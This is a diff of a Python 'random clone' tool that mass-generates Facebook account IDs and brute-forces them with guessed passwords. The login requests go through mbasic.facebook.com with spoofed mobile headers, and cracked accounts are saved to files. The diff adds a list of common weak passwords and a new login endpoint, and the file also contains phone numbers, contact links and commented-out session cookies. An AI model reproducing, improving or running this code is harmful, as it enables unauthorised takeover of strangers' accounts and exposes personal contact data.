@@ -1,9 +1,4 @@
-#HK(MD HRIDOOY YT)(MD DEVIL.KHAN)
-#WhatsApp : 01838873419
-#Github : DEVILkhan104
-#!/usr/bin/python3
-#-*-coding:utf-8-*-
-#!/usr/bin/python3
+
 import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -159,25 +154,31 @@ def menu_apikey():
               ░        ░  ░      ░    ░       ░  ░
             ░                  ░                    \033[31m \n                                                                                                   
 \033[32m      ©===============================================©
-\033[32m     ©      CREATED BY     :  DEVIL                                                              ©
-\033[32m     ©      ADMIN                :  ASHIQUER RAHMAN                                  ©
-\033[32m     ©      Tool name          :  RANDOM CLONE                                         ©
-\033[32m     ©      TOOL VERSION :  1.0.0                                                                ©
-\033[32m     ©      TOOL STATUS   :  FREE                                                                ©
-\033[32m     ©      COUNTRY           :  BANGLADESH                                              ©
-\033[32m     ©      PHONE                :  01841386451                                              ©
+\033[32m     ©      CREATED BY   :  DEVIL                      ©
+\033[32m     ©      ADMIN        :  ASHIQUER RAHMAN            ©
+\033[32m     ©      Tool name    :  DEVIL                      ©
+\033[32m     ©      TOOL VERSION :  1.0.0                      ©
+\033[32m     ©      TOOL STATUS  :  FREE                       ©
+\033[32m     ©      COUNTRY      :  BANGLADESH                 ©
+\033[32m     ©      PHONE        :  01841386451                ©
 \033[32m      ©===============================================©
 \033[32m \n
 \033[1;37m-------------------------------------------""")
-  print(f"\t \033[1;32m Tool By Ashikur Rahman \033[1;37m ")
+ # print(f"\t \033[1;32m Tool By Ashikur Rahman \033[1;37m ")
+#  print(f"")
+#  print(f"\t \033[1;32m  Best Tool for random cloning \033[1;37m ")
+ # print(f"")
+#  print(f"\t \033[1;32m  Whatsapps Number +8801841386451\033[1;37m ")
+#  print(f"")
+#  print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
+ # print(f"")
+  print(f" \033[1;32m  Tool By Ashikur Rahman \033[1;37m\n")
   print(f"")
-  print(f"\t \033[1;32m  Best Tool for random cloning \033[1;37m ")
+  print(f" \033[1;32m  Best Tool For Random Cloning \033[1;37m\n")
   print(f"")
-  print(f"\t \033[1;32m  Whatsapps Number +8801841386451\033[1;37m ")
+  print(f" \033[1;32m  Whatsapp Number +8801841386451 \033[1;37m\n")
   print(f"")
-  print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
-  print(f"")
-  print(f" \033[1;32m  Kno prokar kharap kaj kora jabe na \033[1;37m\n")
+  print(f" \033[1;32m  First GET APPROVAL \033[1;37m\n")
   print(f"")
   print(f"\x1b[1;92m   contract Admin to Get Access                                                               ");time.sleep (0.1) 
   print(f"")
@@ -200,7 +201,7 @@ def menu_apikey():
       
       print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved ")
       print(f"    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system(f'xdg-open https://wa.me/+8801838873419?text='+id)
+      os.system(f'xdg-open https://wa.me/+8801841386451?text='+id)
       time.sleep(2)
       sys.exit()
   except:
@@ -209,7 +210,7 @@ def menu_apikey():
     	print(logo)
     	menu_apikey()
 menu_apikey()
-logo=(f"""\033[31m 
+logo=("""\033[31m 
 
            ▓█████▄  ▓█████  ██▒   █▓  ██▓  ██▓    
            ▒██▀ ██▌ ▓█   ▀▓ ██░   █▒ ▓██▒ ▓██▒    
@@ -222,13 +223,13 @@ logo=(f"""\033[31m
               ░        ░  ░      ░    ░       ░  ░
             ░                  ░                    \033[31m \n                                                                                                   
 \033[32m      ©===============================================©
-\033[32m     ©      CREATED BY     :  DEVIL                                                              ©
-\033[32m     ©      ADMIN                :  ASHIQUER RAHMAN                                  ©
-\033[32m     ©      Tool name          :  RANDOM CLONE                                         ©
-\033[32m     ©      TOOL VERSION :  1.0.0                                                                ©
-\033[32m     ©      TOOL STATUS   :  FREE                                                                ©
-\033[32m     ©      COUNTRY           :  BANGLADESH                                              ©
-\033[32m     ©      PHONE                :  01841386451                                              ©
+\033[32m     ©      CREATED BY   :  DEVIL                      ©
+\033[32m     ©      ADMIN        :  ASHIQUER RAHMAN            ©
+\033[32m     ©      Tool name    :  DEVIL                      ©
+\033[32m     ©      TOOL VERSION :  1.0.0                      ©
+\033[32m     ©      TOOL STATUS  :  FREE                       ©
+\033[32m     ©      COUNTRY      :  BANGLADESH                 ©
+\033[32m     ©      PHONE        :  01841386451                ©
 \033[32m      ©===============================================©
 \033[32m \n
 \033[1;37m-------------------------------------------""")
@@ -287,10 +288,10 @@ def admin():
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801838873419');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801841386451');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100090884797469&mibextid=ZbWKwL');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/ashikur.rahman.96126?mibextid=ZbWKwL');time.sleep(1)
 		admin()
 	if bal =='3':
 		os.system('');time.sleep(1)
@@ -324,13 +325,14 @@ def virus():
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode]
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,'112233','223344','445566','556677','224466','446688','free fire','freefire','freefire123','pubg123']
 			yaari.submit(a,uid,pwx,tl)
 	print(50*'_')
 	print(' [🔥] Crack process has been completed')
 	print(' [🔥] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	input(' Press enter to back ')
+	Main()
 	exit()
 def virus2():
 	user=[]
@@ -410,7 +412,7 @@ def a(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -421,15 +423,14 @@ def a(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
+            header_freefb = { 'authority': 'mbasic.facebook.com',
+    'method': 'GET',
     'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=pVlrZHf9g3xU7SmqiQTKhshO; sb=pVlrZKPz8D7IHWu3m_y_l41j; m_pixel_ratio=2.5687501430511475; wd=421x816; fr=0q5AjzpYcbd5iIKFY..Bka1ml.X4.AAA.0.0.Bka1nF.AWWBlfJxRNA',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    # 'cookie': 'datr=DJFrZACmEPDhgP8bScmboljX; sb=DJFrZAC9Gvg4n2bVSk7hl9ty; m_pixel_ratio=2.5687501430511475; wd=421x816; fr=053mHtzmzEUoLs5F7..Bka5EV.5i.AAA.0.0.Bka5nL.AWUfu7NIH8c',
+    'sec-ch-ua': '"Google Chrome";v="112", "Chromium";v="112", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
@@ -437,9 +438,10 @@ def a(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro
+    'user-agent': pro,
+    'viewport-width': '980',
 }
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
